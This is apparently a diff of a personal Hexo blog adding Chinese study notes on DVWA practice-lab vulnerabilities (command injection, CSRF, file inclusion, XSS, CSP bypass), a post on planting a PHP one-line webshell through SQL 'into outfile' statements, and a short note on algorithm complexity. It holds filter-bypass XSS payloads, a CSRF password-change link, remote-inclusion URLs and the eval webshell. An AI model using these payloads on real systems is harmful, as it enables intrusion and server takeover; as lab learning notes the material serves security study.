href="https://blog.csdn.net/wnvalentin/article/details/89854980?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164871673716780261944117%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164871673716780261944117&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-89854980.142%5Ev5%5Epc_search_result_control_group,143%5Ev6%5Eregister&amp;utm_term=token%E9%AA%8C%E8%AF%81&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/wnvalentin/article/details/89854980?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164871673716780261944117%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164871673716780261944117&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-89854980.142^v5^pc_search_result_control_group,143^v6^register&amp;utm_term=token%E9%AA%8C%E8%AF%81&amp;spm=1018.2226.3001.4187</a><br>——————<br>COMMAND INJECTION<br>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。<br>DVWA中就是让输入一个IP地址，然后去ping这个IP地址。<br>这个漏洞和SQL注入很像，本质上就是绕过过滤使我们上传的payload可以成功执行。<br>low模式下我们上传的数据没有进行过滤检查，我们可以直接构造各种命令进行注入。<br>medium模式类似于黑名单验证，过滤了&amp;&amp;和；，我们通过其他语句执行。<br>high模式同样是利用黑名单过滤不完整的漏洞，果然白名单的安全系数还是更高一些。<br>知识补充：<br>后台代码并未对用户输入的参数ip的值进行过滤就直接与ping命令进行拼接并执行 ，因此我们可以使用常见的命令拼接字符对命令进行拼接，如使用“&amp;”，“|”，“&amp;&amp;”，“||”等，linux系统下还可以使用“;”，“&#96;&#96;”。</p>
+<p>对于shell1 &amp; shell2，既执行shell1的命令也执行shell2的命令；<br>对于shell1 &amp;&amp; shell2，在shell1执行成功的情况下执行shell2，shell1执行失败就不会执行shell2，和逻辑与一样；<br>对于shell1 | shell2，“|”为管道符，它将shell1执行的结果作为shell2的输入，因此无论shell1执行结果如何，都会执行shell2；<br>对于shell1 || shell2，在shell1执行失败的情况下执行shell2，shell1执行成功则不会执行shell2，和逻辑或一样；<br>对于shell1;shell2，在Linux系统下会将shell1和shell2都执行；<br>对于shell1 <code>shell2</code>，shell2的执行结果会在shell1的报错信息中显示。<br>补充知识，命令操作：<a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/Vx5MBqZLdN/">https://www.shuzhiduo.com/A/Vx5MBqZLdN/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/54chensongxia/p/12510758.html">https://www.cnblogs.com/54chensongxia/p/12510758.html</a><br>——————<br>CSRF<br>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。<br>DVWA中就是让修改自己密码。<br>二、CSRF攻击原理<br>CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a><br>三、CSRF攻击实例<br>角色：<br>正常浏览网页的用户：User<br>正规的但是具有漏洞的网站：WebA<br>利用CSRF进行攻击的网站：WebB</p>
+<p>流程：</p>
+<p>步骤一<br>用户登录、浏览并信任正规网站WebA，同时，WebA通过用户的验证并在用户的浏览器中产生Cookie。<br>步骤二<br>攻击者WebB通过在WebA中添加图片链接等方式诱导用户User访问网站WebB。<br>步骤三<br>在用户User被诱导访问WebB后，WebB会利用用户User的浏览器访问第三方网站WebA，并发出操作请求。<br>步骤四<br>用户User的浏览器根据WebB的要求，带着步骤一中产生的Cookie访问WebA。<br>步骤五<br>网站WebA接收到用户浏览器的请求，WebA无法分辨请求由何处发出，由于浏览器访问时带上用户的Cookie，因此WebA会响应浏览器的请求，如此一来，攻击网站WebB就达到了模拟用户操作的目的。</p>
+<p>在low模式下，我们直接构造恶意连接：<a target="_blank" rel="noopener" href="http://192.168.31.155/DVWA-master/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change">http://192.168.31.155/DVWA-master/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change</a><br>现在的用户安全意识都在慢慢变强，所以往往会构建一个黑客的站点，而这个站点的名称可以叫test.html或者直接就用默认的index.html，给用户个IP访问，在index文件中构造payload，一旦访问直接就中招了。<br>在medium模式下，检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.31.155），希望通过这种机制抵御CSRF攻击。<br>在high模式下，检查了token.这两个绕过难度很大。<br>——————<br>INCLUDE　FILEs<br>意思是文件包含（漏洞），是指当服务器开启alLow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的alLow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<p>包含，往往用在复用的地方，比如你写了一个连接数据库的方法，我直接ctrl+c，ctrl+v就可以用，不用我自己再写，当然是使用include关键字来引用你的方法</p>
+<p>DVWA是通过文件包含，来调用file1.php&#x2F;file2.php&#x2F;file3.php<br>我们这题就先利用文件包含漏洞查看服务器文件中的ｐｈｐｉｎｆｏ．ｐｈｐ文件<br>low模式没有任何的保护，直接利用漏洞上传语句就可以了<br>在medium模式下有ｒｅｐｌａｃｅ函数对关键字进行替换，但是替换为空很容易直接双写绕过<br>原本为</p>
+<p>192.168.31.155&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;<a target="_blank" rel="noopener" href="http://192.168.31.103/phpinfo.php">http://192.168.31.103/phpinfo.php</a></p>
+<p>过滤后</p>
+<p>192.168.31.155&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D; 192.168.31.103&#x2F;phpinfo.php</p>
+<p>构造一个新的</p>
+<p>ht<a target="_blank" rel="noopener" href="http://tp//192.168.31.103/phpinfo.txt">http://tp://192.168.31.103/phpinfo.txt</a></p>
+<p>过滤后</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.103/phpinfo.txt">http://192.168.31.103/phpinfo.txt</a></p>
+<p>过滤前</p>
+<p>…&#x2F;.&#x2F;</p>
+<p>过滤后</p>
+<p>…&#x2F;</p>
+<p>构造</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.155/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.31.103/phpinfo.php">http://192.168.31.155/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.31.103/phpinfo.php</a><br>————————<br>INSECURE CAPTCHA<br>利用验证过程是分两步走的漏洞，跳过第一步对原密码的验证，直接进行第二部修改密码。<br>low模式下验证的是step的参数，抓包step的值改为。<br>medium的模式下验证的是passed_captcha这个参数，添加这个参数并且将值改为true。<br>————————<br>DOM—XSS<br>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，<br>当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p>
+<p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，<br>如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。<br>这题给我的感觉就是一种注入。<br>补充一些对前端和js的知识：<br>low模式下对get的default参数没有任何的过滤，直接构建payload就可以完成注入，payload：?default&#x3D;English<script>alert(document.cookie)</script>查看网页的cookie。<br>medium模式下运用到stripos() 	&#x2F;&#x2F; 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>header() 	&#x2F;&#x2F; 函数向客户端发送原始的 HTTP 报头。针对script字段进行了过滤，通过stripos()函数查找script 字符串在default变量中第一次出现的位置，如果匹配成功的话通过location将URL后面的参数修正为?default&#x3D;English，同样这里可以通过其他的标签搭配事件类型来达到弹窗效果<br>构建payload：？default&#x3D;</option></select><img src=1 onerror=alert(666)><br>high模式下对于参数default的检查不好绕过了，但是我们可以通过连接拎一个参数进行渗透。<br>payload：&amp;</option></select>&lt;img src&#x3D;1 onerror&#x3D;alert(‘hahaha’)&gt;</option>，&amp;连接拎一个参数。<br>————————<br>XSS（Reflected）<br>low模式下同样对传入的参数没有任何的检查，我们直接上传想执行的payload就可以了。<br>medium模式下使用了str_replace函数对敏感字符进行了替换，可以双写绕过。也可以大小写绕过。<br>high模式下对scripy严格限制，我们只能通过没有script标签的命令注入。<br>这里补充集中常见标签和XSS漏洞的利用方式：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280415.html">https://www.freebuf.com/articles/web/280415.html</a><br>————————<br>XSS（stored）<br>low模式下我们可以直接在message里写入恶意脚本<br>medium模式下检查注入点，是参数name。通过嵌套、大小写、标签等方法就可以绕过，但是写入JS时发现字符长度被限制了，那么就通过bp抓包来进行注入了。<br>high模式下我们用非script的语句，用标签进行注入就可以了，<br>————————<br>CSP Bypass<br>什么是CSP</p>
+<p>Content-Security-Policy是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。翻译为中文就是绕过内容安全策略。是为了缓解潜在的跨站脚本问题（XSS），<br>浏览器的扩展程序系统引入了内容安全策略这个概念。原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。<br>开发者只需要提供配置，实现和执行全部由浏览器完成。</p>
+<p>l 两种方法可以启用CSP：</p>
+<p>一种是通过HTTP相应头信息的Content-Security-Policy字段；</p>
+<p>另一种是通过网页标签；</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://content-security-policy.com/">https://content-security-policy.com/</a></p>
+<p>例如：</p>
+<p>以上例子中的说明如下：</p>
+<p>script-src脚本：只信任当前域名</p>
+<p>object-src：不信任任何URL，即不加载任何资源</p>
+<p>style-src样式表：只信任<a target="_blank" rel="noopener" href="http://cdn.example.org和http//third-party.org">http://cdn.example.org和http://third-party.org</a></p>
+<p>child-src：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。</p>
+<p>其他资源：没有限制其他资源</p>
+<p>当启用CSP后，不符合CSP的外部资源会被阻止加载。</p>
+<p>l 为什么要使用CSP呢？</p>
+<p>首先，CSP是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少应用程序执行的特权”。<br>当前，CSP还处在快速的发展期，目前正在进行规范中的版本是CSP3，CSP标准由用户代理选择实现。例如，Chrome具有完整的CSP2支持，并且实现了CSP3的大部分工作草案，仅在某些情况下可能会落后于实验中的某些特性，<br>而Mozilla Firefox和基于WebKit的浏览器则刚刚获得了完整的CSP2支持。在实际使用中，CSP策略在Content-Security-Policy HTTP响应头或元素中提供。<br>三种模式的通关策略：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/10906270.html">https://www.cnblogs.com/-zhong/p/10906270.html</a><br>————————<br>Java Script<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jojo-feed/p/10206443.html">https://www.cnblogs.com/jojo-feed/p/10206443.html</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/17/hello-world/" data-id="cl22ryq7a0000k8vjfceg6t56" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/17/DVWA/" data-id="cl22vvyy30001l4vjf5ua5p7i" data-title="DVWA靶场" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-一句话木马补充" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%A1%A5%E5%85%85/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.590Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title-一句话木马补充"><a href="#title-一句话木马补充" class="headerlink" title="title:一句话木马补充"></a>title:一句话木马补充</h2><p>多种方式写入文件，这里的一句话已经转换为十六进制<br><?php phpinfo();?>&#x3D;0x3c3f70687020706870696e666f28293b3f3e<br>换成常见的一句话就是’<?php @eval(post["mima"])?>‘</p>
+<ol>
+<li>union注入写文件</li>
+</ol>
+<p>SELECT * FROM user WHERE id &#x3D; -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile ‘D:&#x2F;1.php’<br>2. FIELDS TERMINATED BY（可在limit等语句后）</p>
+<p>SELECT * FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;1.php’ fields terminated by 0x3c3f70687020706870696e666f28293b3f3e<br>3. LINES TERMINATED BY（可用于limit等sql注入）</p>
+<p>SELECT username FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;1.php’ LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e<br>4. LINES STARTING BY（可用于limit等sql注入）</p>
+<p>SELECT username FROM user WHERE id &#x3D; 1 into outfile ‘D:&#x2F;2.php’ LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%A1%A5%E5%85%85/" data-id="cl22vvyyq000jl4vj3lho27pa" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-算法效率的度量方法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.586Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/">算法效率的度量方法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>算法效率的度量方法：<br>事后统计方法：通过设计好的测试程序和数据，利用计算机计时器对不同算法编制的程序的运行时间进行比较（不要这样嘞）<br>事前分析估算方法：在计算机程序编写前，依据统计方法对算法进行估算。<br>影响因素：<br>1、算法采用的策略、方法<br>2、编译产生的代码质量<br>3、问题的输入规模<br>4、机器执行指令的速度<br>（算法的好坏和输入规模）</p>
+<p>我们研究算法的复杂度，侧重的是研究算法随着输入规模扩大增长量的一个抽象，而不是<br>精确的定位需要执行多少次，重要的是把基本操作的数量和输入模式关联起来<br>函数的渐近增长，类似数学的极限等价高阶低阶无穷的判断，即函数的常数项和其他的<br>次要项常常可以忽略。主要关注主项，但可以忽略与主项相乘的常数项。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/" data-id="cl22vvyys000pl4vjc1zbcc47" data-title="算法效率的度量方法" class="article-share-link">Share</a>
       
       
       
@@ -152,6 +466,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -169,7 +488,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
     </div>
   </div>
 
@@ -182,11 +501,23 @@
       <ul>
         
           <li>
-            <a href="/2022/04/17/%E6%B5%8B%E8%AF%95/">(no title)</a>
+            <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2022/04/17/hello-world/">Hello World</a>
+            <a href="/2022/04/17/less%2038~42/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/LESS%2032~37/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2029~31/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/less%2018~22/">(no title)</a>
           </li>
         
       </ul>
